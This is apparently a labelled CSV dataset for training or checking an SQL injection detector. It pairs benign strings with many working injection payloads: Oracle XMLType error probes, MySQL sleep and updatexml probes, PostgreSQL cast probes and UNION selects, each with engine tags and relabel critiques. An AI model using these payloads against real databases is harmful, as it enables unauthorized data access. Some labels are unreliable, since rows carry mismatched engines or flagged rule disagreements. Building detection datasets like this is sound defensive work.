payload_norm,sqli_type,db_engine,confidence,reasoning,payload_inner,wrapper_detected,strip_depth,payload_delex_v2,verdict,critique_reasons
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 262310,262326,262328 ) ORDER BY meta_id ASC",benign,mysql,0.9,not_sql_injection,"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 262310,262326,262328 ) ORDER BY meta_id ASC",False,0,"select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ in ( __INT__ , __INT__ , __INT__ ) order by __IDENT__ asc",RELABEL,reasoning too short (17 chars)
"select * from users WHERE username = ""-4610\' ) ) or username = ""-1254"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,postgresql,0.9,PostgreSQL cast numeric,"-4610\' ) ) or username = ""-1254"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",True,1,-__INT__\' ) ) or __IDENT__ = __STR__ and __INT__ = cast ( ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) ::__IDENT__ || ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) as __IDENT__ ) --,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
"select * from users WHERE username = ""1 ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) """,boolean_blind,oracle,0.8,dbms_utility.sqlid_to_sqlhash for blind,"1 ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ",True,1,"__INT__ ) ) and __INT__ = __IDENT__ ( ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) and __IDENT__ = ""-__INT__ ) or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual )",KEEP,
"-7744"" ) ) ) union all select 9408,9408,9408,9408--",union_based,generic,0.85,UNION ALL for union-based,"-7744"" ) ) ) union all select 9408,9408,9408,9408--",False,0,"-__INT__"" ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ --",KEEP,
cossovel-heintel@camiones-hibridos.ec,benign,generic,0.9,not_sql_injection,cossovel-heintel@camiones-hibridos.ec,False,0,__IDENT__-__IDENT__@__IDENT__-__IDENT__,RELABEL,reasoning too short (17 chars)
"1"" ) as wsyv where 8142 = 8142 rlike sleep ( 5 ) #",time_blind,generic,0.9,sleep() with rlike for time blind,"1"" ) as wsyv where 8142 = 8142 rlike sleep ( 5 ) #",False,0,"__INT__"" ) as __IDENT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) #",KEEP,
1'+ ( select 'ymgm' where 8204 = 8204 and sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,1'+ ( select 'ymgm' where 8204 = 8204 and sleep ( 5 ) #,False,0,1__STR__ymgm' where __INT__ = __INT__ and sleep ( __INT__ ) #,KEEP,
kava_ivic@comercioenlacalle.info,benign,generic,0.9,not_sql_injection,kava_ivic@comercioenlacalle.info,False,0,__IDENT__@__IDENT__,RELABEL,reasoning too short (17 chars)
SELECT TOP 3 * FROM wave SELECT * FROM tribe 3SELECT * FROM football,benign,generic,1.0,Invalid SQL syntax - not an attack,SELECT TOP 3 * FROM wave SELECT * FROM tribe 3SELECT * FROM football,False,0,select __IDENT__ __INT__ * from __IDENT__ select * from __IDENT__ 3select * from __IDENT__,KEEP,
"select * from users WHERE username = ""-8069\' ) ) and username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'""",error_based,oracle,0.9,Oracle xmltype case-based,"-8069\' ) ) and username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'",True,1,"-__INT__\' ) ) and __IDENT__ = ""__INT__\' + ( select \'__IDENT__\' where __INT__ = __INT__ and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) ) + \'",KEEP,
raixa s/n,benign,generic,0.9,not_sql_injection,raixa s/n,False,0,__IDENT__ __IDENT__ / __IDENT__,RELABEL,reasoning too short (17 chars)
walker,benign,generic,0.9,not_sql_injection,walker,False,0,__IDENT__,RELABEL,reasoning too short (17 chars)
"1' ) where 2121 = 2121 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.7,firebird_sysjoin,"1' ) where 2121 = 2121 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",False,0,"__INT__' ) where __INT__ = __INT__ or __INT__ = ( select __IDENT__ ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) --",RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4)
"1"" ) where 2922 = 2922 or elt ( 6272 = 6272,sleep ( 5 ) ) --",time_blind,mysql,0.7,elt_sleep,"1"" ) where 2922 = 2922 or elt ( 6272 = 6272,sleep ( 5 ) ) --",False,0,"__INT__"" ) where __INT__ = __INT__ or elt ( __INT__ = __INT__ , sleep ( __INT__ ) ) --",RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5)
"SELECT magic,perfectly,its FROM discover LEFT JOIN Orders ON down.broadID = happened.consist ORDER BY occur.save",benign,generic,1.0,Normal SQL SELECT LEFT JOIN ORDER BY,"SELECT magic,perfectly,its FROM discover LEFT JOIN Orders ON down.broadID = happened.consist ORDER BY occur.save",False,0,"select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ left join __IDENT__ on __IDENT__ = __IDENT__ order by __IDENT__",KEEP,
"select * from users WHERE username = ""1 and username = ""-6190\' ) where 2621 = 2621 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-7242\'",error_based,oracle,0.95,select from dual xmltype error,"select * from users WHERE username = ""1 and username = ""-6190\' ) where 2621 = 2621 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-7242\'",False,0,select * from __IDENT__ where __IDENT__ = __STR__-__INT__\' ) where __INT__ = __INT__ or -- __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) -- __STR__-__INT__\',KEEP,
"1'|| ( select 'wqmz' where 6400 = 6400 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) ) ||'",heavy_query,generic,0.85,Multiple table join,"1'|| ( select 'wqmz' where 6400 = 6400 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) ) ||'",False,0,"1__STR__wqmz where __INT__ = __INT__ and __IDENT__ ( __INT__ , __INT__ ) > ( select __IDENT__ ( * ) , concat ( __HEX__ , ( select ( elt ( __INT__ = __INT__ , __INT__ ) ) ) , __HEX__ , __IDENT__ ( __IDENT__ ( __INT__ ) * __INT__ ) ) __IDENT__ from ( select __INT__ union select __INT__ union select __INT__ union select __INT__ ) __IDENT__ group by __IDENT__ ) ) ||",RELABEL,reasoning too short (19 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4)
"select * from users WHERE username = ""1"" or username = ""1%\' or username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,oracle,0.9,cast for PostgreSQL injection,"1%\' or username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",True,1,__INT__ % \' or __IDENT__ = __INT__\' || ( select \'__IDENT__\' from dual where __INT__ = __INT__ and __IDENT__ = -__INT__\' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = cast ( ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) ::__IDENT__ || ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) as __IDENT__ ) --,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
"select * from users WHERE username = ""-6720\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""1%\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",error_based,oracle,0.95,Oracle ctxsys + XMLType error,"select * from users WHERE username = ""-6720\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""1%\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",False,0,"select * from __IDENT__ where __IDENT__ = -__INT__\' ) ) ) or __INT__ = ctxsys . __IDENT__.__IDENT__ ( __INT__ , ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) and __IDENT__ = __INT__ % \' ) ) ) and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual )",KEEP,
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and username = ""1%\' ) ) )",error_based,oracle,0.8,basic nested query with %,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and username = ""1%\' ) ) )",False,0,"select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = ""__INT__ % \' ) ) )",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
"1 ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 )",error_based,mysql,0.9,updatexml,"1 ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 )",False,0,"__INT__ ) and updatexml ( __INT__ , concat ( __HEX__ , __HEX__ , ( select ( elt ( __INT__ = __INT__ , __INT__ ) ) ) , __HEX__ ) , __INT__ )",RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
1 ) ) as emtf where 3561 = 3561 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,time_blind,mysql,0.7,sleep_subquery,1 ) ) as emtf where 3561 = 3561 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,False,0,__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or ( select * from ( select ( sleep ( __INT__ ) ) ) __IDENT__ ) --,RELABEL,reasoning too short (14 chars)
SELECT * FROM living WHERE science = 'seen' LIMIT 3,benign,generic,1.0,Normal SELECT with LIMIT and WHERE,SELECT * FROM living WHERE science = 'seen' LIMIT 3,False,0,select * from __IDENT__ where __IDENT__ = __STR__ limit __INT__,KEEP,
"1' or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",time_blind,postgresql,0.7,generate_series,"1' or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",False,0,"__INT__' or __INT__ = ( select __IDENT__ ( * ) from __IDENT__ ( __INT__ , __INT__ ) ) --",RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'heavy_query' (P4) but labeled 'time_blind' (P5)
yaonan,benign,generic,0.9,not_sql_injection,yaonan,False,0,__IDENT__,RELABEL,reasoning too short (17 chars)
14li6l4,benign,generic,0.9,not_sql_injection,14li6l4,False,0,14li6l4,RELABEL,reasoning too short (17 chars)
"select * from users WHERE username = ""1 ) ) as xoch where 8765 = 8765 and username = ""-2756\' where 6156 = 6156 or username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'mfmk\' = \'mfmk""",error_based,oracle,0.95,select from dual xmltype error,"1 ) ) as xoch where 8765 = 8765 and username = ""-2756\' where 6156 = 6156 or username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'mfmk\' = \'mfmk",True,1,__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ = __IDENT__\' ) ) ) and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) and ( ( ( \'__IDENT__\' = \'__IDENT__,KEEP,
kaz,benign,generic,0.9,not_sql_injection,kaz,False,0,__IDENT__,DROP,payload too short (3 chars)
mosen agustin jerico 183 2h,benign,generic,0.9,not_sql_injection,mosen agustin jerico 183 2h,False,0,__IDENT__ __IDENT__ __IDENT__ __INT__ 2h,RELABEL,reasoning too short (17 chars)
"select * from users WHERE username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""-1641\' ) ) or ( ( 5299 = 5299""",error_based,oracle,0.95,Oracle xmltype extraction,1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ,True,1,__INT__\' and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ),KEEP,
SELECT COUNT ( DISTINCT purple ) FROM even,benign,generic,1.0,Normal SQL SELECT COUNT DISTINCT,SELECT COUNT ( DISTINCT purple ) FROM even,False,0,select __IDENT__ ( __IDENT__ __IDENT__ ) from __IDENT__,KEEP,
bears,benign,generic,0.9,not_sql_injection,bears,False,0,__IDENT__,RELABEL,reasoning too short (17 chars)
-9581 ) as jkqo where 5200 = 5200 or 6872 = 6872--,boolean_blind,generic,0.5,or_equality,-9581 ) as jkqo where 5200 = 5200 or 6872 = 6872--,False,0,-__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --,RELABEL,reasoning too short (11 chars); confidence too low (0.50)
SELECT * FROM now WHERE process = 'treated' LIMIT 3,benign,mysql,1.0,SELECT with LIMIT - MySQL - normal query,SELECT * FROM now WHERE process = 'treated' LIMIT 3,False,0,select * from __IDENT__ where __IDENT__ = __STR__ limit __INT__,KEEP,
SELECT rose ( s FROM glass RIGHT JOIN,benign,mysql,0.9,not_sql_injection,SELECT rose ( s FROM glass RIGHT JOIN,False,0,select __IDENT__ ( __IDENT__ from __IDENT__ right join,RELABEL,reasoning too short (17 chars)
"select * from users WHERE username = ""-8163 ) ) as cvai where 2360 = 2360 or username = ""-5863"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""gkvy"" = ""gkvy""",error_based,oracle,0.95,Oracle XMLType error extraction,"-8163 ) ) as cvai where 2360 = 2360 or username = ""-5863"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""gkvy"" = ""gkvy",True,1,"-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ = __STR__ or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) and __STR__ = ""__IDENT__",KEEP,
"select * from users WHERE username = ""-8860 ) and username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-3859 )",error_based,oracle,0.95,xmltype for Oracle error extraction,"select * from users WHERE username = ""-8860 ) and username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-3859 )",False,0,select * from __IDENT__ where __IDENT__ = __STR__-__INT__\' where __INT__ = __INT__ or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) -- __STR__-__INT__ ),KEEP,
